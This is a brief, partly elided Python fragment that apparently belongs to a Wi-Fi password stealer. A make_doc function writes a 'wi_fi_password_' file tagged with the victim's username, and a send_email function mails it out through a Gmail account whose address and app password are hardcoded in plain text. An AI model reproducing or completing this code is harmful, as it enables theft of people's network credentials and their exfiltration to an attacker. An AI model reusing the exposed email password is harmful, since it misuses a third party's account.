...
def make_doc(zip_file):
    ...
    filename = "wi_fi_password_"+username+".txt"
...
def send_email(document):
    ...
    sender_email = "ayushmanmedcalia089@gmail.com"
    sender_password = "rouaxsxdwztrbqhd"
    receiver_email = "ayushmanmedcalia089@gmail.com"
